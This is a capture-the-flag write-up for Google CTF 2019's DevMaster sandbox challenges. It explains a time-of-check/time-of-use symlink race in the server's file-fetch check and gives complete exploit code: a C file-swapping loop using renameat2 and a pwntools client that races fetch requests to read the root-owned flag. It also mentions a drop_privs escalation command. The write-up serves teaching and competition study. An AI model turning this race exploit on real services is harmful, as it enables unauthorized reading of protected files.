DevMaster 8000 and DevMaster 8001 were sandbox challenges on Google CTF 2019
quals.

The gist is it provided a compilation service over an asynchronous binary
protocol. User can upload files, run arbitrary commands, and fetch files.

I solved both parts of the task using TOCTOU symlink attack, which is likely
an unintended solution. The unmodified exploit written for the first part
worked for the second one.

## Overview

The following commands are available:  
* **Build**. Takes a command to run, and list of tuples `(filename, file_contents)`. The server creates a temporary build directory, puts all the files in there, and runs a command. For example, you can send a set of C sources, and run `gcc main.c`. You can also run just compiled binary as well: `gcc main.c && ./a.out`.  
* **Fetch**. Downloads a specified file from the build directory. Legitimate user would probably use this to download build artifacts.  
* **Admin**. Starts admin panel binary.  
* **Stdin**. Used to pass input to the build or admin panel process.

The server asynchronously sends events to the client as well:  
* **Stdout**. Build or admin panel stdout.  
* **Stderr**. Likewise for stderr.  
* **Exited**. When build process or admin panel exits.  
* **Fetched**. Response to successful **Fetch** command. Contains file contents.  
* **ServerError**. I never checked when it happens.

The admin panel binary asks for a password, and if it's correct, opens a flag
and returns it. The password is stored in hashed form, so it's unlikely it can
be recovered. Besides, remote server binary might have had a different
password than the one in attached sources.

The build process runs in a sandbox under one of the `sandbox-
runner-0`..`sandbox-runner-7` users which lacks permissions to read the flag,
so you can't submit and run binary reading the flag.

The **Fetch** command, however, runs under root user without impersonating the
sandbox user. But it has a `realpath`-based check that ensured that the file
path resolves to a path in build directory, preventing absolute paths, path
traversals and symlink attacks (spoiler: not quite).

Additionally, the server is asynchronous, and can execute **Fetch** when
**Build** is running.

## Vulnerability

Let's take a closer look at **Fetch** command implementation.

```c++  
 std::unique_ptr<char> real_path(realpath((dir + file).c_str(), nullptr));  
 if (string(real_path.get()).substr(0, dir.size()) != dir) {  
   SendServerError(string("Filenames must point to within the working
directory, ") + dir +  
                   string(". Attempted to fetch file with absolute path ") + real_path.get());  
   return;  
 }

 ifstream infile(real_path.get());  
 if (!infile.is_open()) {  
   SendServerError(string("Failed to open file  ") + real_path.get() +  
                   string(": ") + strerror(errno));  
 }  
 string body = ReadFile(infile);  
```  
  
Although this code attempts to resolve symlinks to prevent symlink attacks,
imagine what happens if regular file becomes a symlink after the check, but
before opening the file. It will happily open a symlink. A classic TOCTOU bug.  
  
## Exploit

We can abuse the asynchronous behaviour of the server by sending a code that
repeatedly exchanges regular file with symlink, and while it's running, trying
to execute the **Fetch** command.

The exploit uses two files in the build directory:  
* `f1` - a regular file.  
* `f2` - a symlink to the flag file.  
  
By repeatedly swapping `f1` and `f2`, there can be three outcomes:  
* `f1` -> `/home/user/flag` at the time of check. You'll get `Filenames must point to within the working directory, /home/user/builds/build-workdir-HoQhea/. Attempted to fetch file with absolute path /home/user/flag` error.  
* `f1` (regular file) at the both time of check and time of use. The fetch will return its contents.  
* `f1` (regular file) at the time of check, but `f1` -> `/home/user/flag` at the time of use. The check will pass, but fetch will return the contents of the flag.

`f2` file is not strictly necessary, as you can just repeatedly recreate `f1`
file. However, in order to improve exploit efficiency, I used atomic replace
(`renameat2(AT_FDCWD, "f1", AT_FDCWD, "f2", RENAME_EXCHANGE)`) to eliminate
window where file is unavailable (which would crash the server). Although
`renameat2` and `RENAME_EXCHANGE` are unavailable in glibc shipped with Ubuntu
16.04, the kernel has them, and can be easily reached with raw syscall
interface.

The server still occasionally crashes when symlink becomes a file during
`realpath`, though:  
```  
lstat("/home/user/builds/build-workdir-8Tm4rJ/f1", {st_mode=S_IFLNK|0777,
st_size=15, ...}) = 0  
readlink("/home/user/builds/build-workdir-8Tm4rJ/f1", 0x7ffec1af4df0, 4095) =
-1 EINVAL (Invalid argument)  
```

## Intended solution?

The intended solution for the first part was that admin binary was to run a
suid helper that changed user to `admin`. You can call this binary from the
build to elevate privileges to admin: `/home/user/drop_privs admin admin cat
/home/user/flag`

The second part fixes the permission bits so you can no longer call this
binary.

What I didn't mention and didn't use in my exploit is that the container
rebuilded the admin panel binary every 30 seconds using the same server. The
compilation command was slowed down, likely to enlarge some race condition
window: `sleep 1; g++ --std=c++11 admin.cc -ftemplate-depth=1000000 -o admin;
sleep 1`.

I can only speculate what the intended race condition was.

The sandbox users are protected with System V semaphores (one mutex per user).
You won't get the same UID when build is in progress, which prevents you from
rewriting build artifacts. However, the semaphore is released as soon as build
completes, so you can try to get the same UID and rewrite the build artifacts
before **Fetch** is run.

The window of opportunity is rather small, though, as build executor uses a
busy loop with sleep instead of blocking. It'll take up to 10ms before it
notices that the user has become free, which gives the admin builder process
plenty of time to fetch the binary, and makes the race hard to exploit. I
never tested this in practice, though.

```c  
// Linux doesn't offer a mechanism for waiting on multiple semaphores at once.  
// So, sadly, we busywait.  
// Returns the index of which semaphore was in fact decremented.  
size_t MultiDecrement(std::vector<IpcSemaphore>* sems, int count=1) {  
 while(true) {  
   for (size_t i = 0; i < sems->size(); ++i) {  
     if ((*sems)[i].TryDecrement(count)) return i;  
   }  
 usleep(10000);  // 10 ms  
 }  
}  
```

## Exploit code

```c  
#define _GNU_SOURCE  
#include <stdio.h>  
#include <unistd.h>  
#include <fcntl.h>  
#include <stdio.h>  
#include <unistd.h>  
#include <sys/syscall.h>

#ifndef __NR_renameat2  
#define __NR_renameat2 316  
#endif

#ifndef RENAME_EXCHANGE  
#define RENAME_EXCHANGE (1<<1)  
#endif

#ifndef AT_FDCWD  
#define AT_FDCWD -100  
#endif

int main() {  
   const char *FILENAME1 = "f1";  
   const char *FILENAME2 = "f2";

   {  
       FILE *f = fopen(FILENAME1, "w");  
       fputs("1", f);  
       fclose(f);  
   }  
   symlink("/home/user/flag", FILENAME2);

   puts("hi");  
   fflush(stdout);

   alarm(5); // sanity time limit  
   for (;;) {  
       syscall(__NR_renameat2, AT_FDCWD, FILENAME1, AT_FDCWD, FILENAME2, RENAME_EXCHANGE);  
   }

   return 0;  
}  
```

```python  
#!/usr/bin/env python2

from __future__ import print_function

from pwn import *

import sys  
import threading  
import time  
import io

def send_command(p, opcode, body):  
   p.send(p32(opcode))  
   p.send(pack_string(body))

def pack_string(s):  
   return p32(len(s)) + s

def send_build(p, ref_id, args, files):  
   tmp = b""  
   tmp += p32(ref_id)  
   tmp += p32(len(args))  
   for arg in args:  
       tmp += pack_string(arg)  
   tmp += p32(len(files))  
   for f in files:  
       tmp += pack_string(f[0])  
       tmp += pack_string(f[1])

   send_command(p, 3, tmp)

def send_fetch(p, ref_id, filename):  
   send_command(p, 7, p32(ref_id) + p32(len(filename)) + filename)

def read_string(p):  
   n = u32(p.read(4))  
   return p.read(n)

def reader():  
   while True:  
       opcode = u32(p.read(4))  
       body_len = u32(p.read(4))  
       body = p.read(body_len)

       if opcode == 1:  
           ref_id = u32(body[0:4])  
           n = u32(body[4:8])  
           s = body[8:8+n]  
           print("stdout=%r" % s, file=sys.stderr)

           got_stdout.set()

       elif opcode == 8:  
           b = io.BytesIO(body)

           ref_id = u32(b.read(4))   
           filename = read_string(b)  
           contents = read_string(b)  
           print("fetched file=%r contents=%r" % (filename, contents), file=sys.stderr)  
       else:  
           print("opcode=%d body=%r" % (opcode, body), file=sys.stderr)

command = "gcc main.c && ./a.out"  
  
got_stdout = threading.Event()

with remote("127.0.0.1", 1337) as p:  
#with remote("devmaster.ctfcompetition.com", 1337) as p:  
#with remote("devmaster-8001.ctfcompetition.com", 1337) as p:  
   t = threading.Thread(target=reader)  
   t.start()

   time.sleep(5)

   send_build(p, 0, ["sh", "-c", command], [("main.c",
open("main2.c").read())])

   got_stdout.wait()  
   for _ in xrange(1000):  
       send_fetch(p, 0, "f1")  
       time.sleep(0.1)

   t.join()  
```

Original writeup (https://blog.bushwhackers.ru/googlectf2019-devmaster/).